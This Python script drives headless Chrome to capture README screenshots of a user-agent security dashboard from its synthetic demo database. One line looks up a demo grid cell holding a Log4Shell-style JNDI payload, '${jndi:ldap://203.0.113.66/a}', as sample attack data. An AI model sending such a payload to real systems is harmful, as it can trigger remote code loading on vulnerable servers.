"""Regenerates the README screenshots in docs/screenshots/ from a running
dashboard, using headless Chrome over the DevTools protocol.

    python -m sentry_ua.demo --db demo_user_agents.db
    SENTRY_UA_DB_PATH=demo_user_agents.db streamlit run dashboard.py --server.port 8599
    python scripts/capture_screenshots.py --app http://localhost:8599

Only ever point this at the synthetic demo database - screenshots end up
in a public repo. Needs Chrome/Chromium and the `websockets` package
(already installed as a Streamlit dependency).
"""
import argparse
import asyncio
import base64
import itertools
import json
import pathlib
import shutil
import subprocess
import tempfile
import urllib.parse
import urllib.request

from websockets.asyncio.client import connect

REPO_ROOT = pathlib.Path(__file__).resolve().parent.parent
DEFAULT_OUT = REPO_ROOT / "docs" / "screenshots"
WIDTH, HEIGHT = 1440, 900
DEBUG_PORT = 9333

GRID_HAS_ROWS = """(() => {
  for (const f of document.querySelectorAll('iframe')) {
    try { if (f.contentDocument.querySelectorAll('.ag-center-cols-container .ag-row').length) return true; }
    catch (e) {}
  }
  return false;
})()"""

# Streamlit custom components (AG Grid included) are same-origin iframes,
# so the grid's cells are reachable from the parent page.
CLICK_GRID_CELL = """((text) => {
  for (const f of document.querySelectorAll('iframe')) {
    let doc; try { doc = f.contentDocument; } catch (e) { continue; }
    if (!doc) continue;
    for (const cell of doc.querySelectorAll('.ag-cell')) {
      if (cell.textContent.trim() === text) {
        const opts = {bubbles: true, cancelable: true, view: f.contentWindow};
        for (const type of ['mousedown', 'mouseup', 'click']) cell.dispatchEvent(new MouseEvent(type, opts));
        return true;
      }
    }
  }
  return false;
})"""

DONUT_TAB = "[...document.querySelectorAll('[role=tab]')].find(e => e.textContent.trim() === 'Donut')"
EXPANDER = "[...document.querySelectorAll('summary')].find(e => e.textContent.includes('HIT DISTRIBUTION'))"
SEARCH_BOX = "document.querySelector('input[placeholder^=\"search all fields\"]')"


class Page:
    def __init__(self, ws, out_dir):
        self.ws = ws
        self.out_dir = out_dir
        self.ids = itertools.count(1)

    async def call(self, method, **params):
        msg_id = next(self.ids)
        await self.ws.send(json.dumps({"id": msg_id, "method": method, "params": params}))
        while True:
            msg = json.loads(await self.ws.recv())
            if msg.get("id") == msg_id:
                if "error" in msg:
                    raise RuntimeError(f"{method}: {msg['error']}")
                return msg["result"]

    async def js(self, expr):
        result = await self.call("Runtime.evaluate", expression=expr, awaitPromise=True, returnByValue=True)
        return result["result"].get("value")

    async def wait_for(self, expr, timeout=40):
        for _ in range(timeout * 4):
            if await self.js(expr):
                return
            await asyncio.sleep(0.25)
        raise TimeoutError(expr)

    async def open(self, url):
        await self.call("Page.navigate", url=url)
        await asyncio.sleep(2)
        await self.wait_for(GRID_HAS_ROWS)
        await asyncio.sleep(3)  # fonts, charts, autosized columns

    async def save(self, name):
        data = (await self.call("Page.captureScreenshot", format="png"))["data"]
        path = self.out_dir / name
        path.write_bytes(base64.b64decode(data))
        print(f"wrote {path}")


async def capture(app, chrome, out_dir):
    out_dir.mkdir(parents=True, exist_ok=True)
    profile = tempfile.mkdtemp(prefix="sentry-ua-shots-")
    proc = subprocess.Popen([
        chrome, "--headless=new", f"--remote-debugging-port={DEBUG_PORT}",
        f"--user-data-dir={profile}", "--hide-scrollbars", "--force-color-profile=srgb",
        f"--window-size={WIDTH},{HEIGHT}", "about:blank",
    ])
    try:
        target = None
        for _ in range(80):
            try:
                with urllib.request.urlopen(f"http://127.0.0.1:{DEBUG_PORT}/json/list") as resp:
                    target = next(t for t in json.load(resp) if t["type"] == "page")
                break
            except Exception:
                await asyncio.sleep(0.25)
        if target is None:
            raise RuntimeError("headless Chrome didn't expose a DevTools page target")

        async with connect(target["webSocketDebuggerUrl"], max_size=64 * 1024 * 1024) as ws:
            page = Page(ws, out_dir)
            await page.call("Page.enable")
            await page.call("Emulation.setDeviceMetricsOverride", width=WIDTH, height=HEIGHT,
                            deviceScaleFactor=1, mobile=False)

            # Overview.
            await page.open(f"{app}/?theme=night")
            await page.save("dashboard.png")

            # Structured query, straight from a shareable ?q= link.
            query = "(suspicious) and (addr in 10.0.0.0/8)"
            await page.open(f"{app}/?theme=night&q={urllib.parse.quote(query)}")
            if await page.js(f"{SEARCH_BOX}.value") != query:
                raise RuntimeError("?q= wasn't applied to the search box")
            await page.save("query.png")

            # Hit distribution donut.
            await page.open(f"{app}/?theme=graphite")
            await page.js(f"{EXPANDER}.click()")
            await page.wait_for(f"!!{DONUT_TAB}")
            await page.js(f"{DONUT_TAB}.click()")
            await page.wait_for(f"{DONUT_TAB}.getAttribute('aria-selected') === 'true'")
            await asyncio.sleep(4)
            await page.save("charts.png")

            # Event inspector for the Log4Shell-style probe UA.
            await page.open(f"{app}/?theme=amber")
            if not await page.js(CLICK_GRID_CELL + "('${jndi:ldap://203.0.113.66/a}')"):
                raise RuntimeError("demo row not found - is the app pointed at the demo database?")
            await page.wait_for("!!document.querySelector('[role=dialog]')")
            await asyncio.sleep(4)
            await page.save("inspector.png")
    finally:
        proc.terminate()
        shutil.rmtree(profile, ignore_errors=True)


def find_chrome():
    for candidate in (
        shutil.which("google-chrome"), shutil.which("chromium"), shutil.which("chrome"),
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
    ):
        if candidate and pathlib.Path(candidate).exists():
            return candidate
    return None


def main():
    parser = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    parser.add_argument("--app", default="http://localhost:8599", help="running dashboard URL (default: %(default)s)")
    parser.add_argument("--chrome", default=find_chrome(), help="Chrome/Chromium executable")
    parser.add_argument("--out", type=pathlib.Path, default=DEFAULT_OUT)
    args = parser.parse_args()
    if not args.chrome:
        parser.error("couldn't find Chrome - pass --chrome /path/to/chrome")
    asyncio.run(capture(args.app.rstrip("/"), args.chrome, args.out))


if __name__ == "__main__":
    main()
